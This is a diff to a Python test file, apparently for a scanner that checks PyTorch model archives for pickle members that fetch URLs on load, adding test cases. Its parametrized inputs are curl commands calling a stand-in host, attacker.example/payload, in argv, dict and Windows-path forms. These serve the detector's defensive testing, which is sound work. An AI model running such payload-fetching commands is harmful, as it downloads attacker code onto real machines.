@@ -4543,8 +4543,18 @@ def test_pytorch_zip_filters_urls_only_for_clean_pickle_members(
         "'/usr/bin/curl' 'https://attacker.example/payload'",
         "['/usr/bin/curl', 'https://attacker.example/payload']",
         "cmd='/usr/bin/curl https://attacker.example/payload'",
+        "{'argv': ['curl'], 'url': 'https://attacker.example/payload'}",
+        r"C:\Windows\System32\curl.exe https://attacker.example/payload",
     ],
-    ids=["shell-pipeline", "f-string-format-dispatch", "adjacent-curl-argv", "list-curl-argv", "assigned-curl-command"],
+    ids=[
+        "shell-pipeline",
+        "f-string-format-dispatch",
+        "adjacent-curl-argv",
+        "list-curl-argv",
+        "assigned-curl-command",
+        "split-dict-curl-argv",
+        "windows-curl-command",
+    ],
 )
 def test_pytorch_zip_keeps_implicit_execution_urls_actionable(
     tmp_path: Path,
